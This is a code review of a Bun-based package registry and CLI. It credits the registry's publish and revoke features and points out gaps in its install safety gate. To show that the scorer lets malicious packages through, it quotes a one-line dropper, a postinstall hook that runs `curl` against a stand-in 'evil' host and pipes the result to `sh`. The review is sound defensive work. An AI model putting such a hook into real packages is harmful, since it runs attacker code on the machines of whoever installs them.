`bun scripts/score.ts` → `declared=92 pass=92`, 0 failing. I read the registry, core, CLI, scanner and web code, and fetched the live UI (`?q=tiny`, `/package/color-helper-pro`).

**What is genuinely good.** The three npm problems the user named are each answered with something real, not a mock. Publishing: `apm publish` packs with the project's own PM, prints the file list and sizes, refuses secrets and missing `main`/`types`/`bin`, bumps, dry-runs, and never lets a prerelease take `latest` when a stable exists. Pulling a bad version: yank (lockfiles keep working, proven with a cold-cache reinstall), revoke (410 tarball, critical advisory to `bun audit`/`npm audit`, version number burned), pending revoke with second-owner confirm, restore, and a one-call incident that revokes tokens and every version since a timestamp — all password-gated, all in a public log. That is materially better than npm. The safety signal is per-version, explained with file:line evidence, popularity-free, and honest about what it cannot see. Bun-first is real: `Bun.serve`, `bun:sqlite`, `Bun.password`, `Bun.semver`, and the `Bun.Security.Scanner` hook, which is a Bun-only capability no npm client can match, while stock npm/pnpm still work through the wire protocol. The web UI is the right amount of effort: Vercel-Domains-style fixed top-results block, score chips, decision facts, versions table, public log. The package page for `color-helper-pro` reads well and explains an F/35 in one screen.

**Gap 1 — the score floor does not stop the canonical attack.** I ran the scorer directly: `postinstall: "curl -s https://evil/x.sh | sh"` scores **60/C** (install-script −15, shell-exec −15, network −10); `postinstall: "node -e \"require('https').get(...)\""` scores **75/B**. Both clear the floor of 40, so `apm add`, `@apm/bun-scanner` and `~safe` all let them install. The only test of the floor (`evil-dep`) stacks five signals to reach ~10, so the suite never exercises the one-line dropper. The additive model means the single most common 2025-26 worm shape is graded "C, fine". Change: treat install-script combined with shell-exec or network as a hard fail — a `fatal` signal that `policyBlock` blocks regardless of the number, or cap the score at 20/F for that combination — and add a test that a one-line `curl|sh` postinstall is refused by `apm add` and by the scanner. This is the difference between a safety signal and a safety gate.

**Gap 2 — `apm add` gates only the spec you typed.** `resolveSpec` checks one package; the tree the PM then installs is never looked at, and the CLI never writes `[install.security] scanner` into `bunfig.toml`. So `apm add express` is exactly as safe as `bun add express` — the compromised transitive dep, which is how nearly every real incident arrives, is invisible. Change: after the PM exits, walk `node_modules` (reuse `installedPackages` from `cmdAudit`) and POST to `/-/apm/v1/scan`; fail the command naming the offending paths, or for bun projects write the scanner line into `bunfig.toml` on first `apm add` so stock installs stay covered afterwards.

**Gap 3 — the CLI resolves against one registry and the PM installs from another.** `loadConfig` honours `APM_REGISTRY`, but `runCmd` passes only `process.env`, and `saveToken` writes the `_authToken` line without a `registry=` line. On a fresh machine, `apm login` then `apm add zod` scores against apmjs.dev and then runs `bun add zod@3.x` against registry.npmjs.org: the gate is decorative and the token is unused. The help text advertises `APM_REGISTRY` as sufficient, and no test covers that path (the harness always writes `registry=` into `.npmrc`). Change: pass `--registry <url>` to the PM or set `npm_config_registry` in the child env, have `apm login` write `registry=` next to the token, and add a test with `APM_REGISTRY` set and no `.npmrc` registry line.

**Smaller notes, not gaps.** A brand-new package whose first publish is `1.0.0-beta.1 --tag latest` still becomes `latest` (the guard only fires when a stable latest exists). `apm publish`'s preview passes `previousPublishers: []` and no risky deps, so the preview score can be higher than the server's. `apps/web/lib/utils.ts` re-exports `cn` from a third-party package named `cn` instead of clsx + tailwind-merge, and `shadcn` sits in `dependencies` — both are supply-chain smells in a project whose thesis is supply-chain safety.
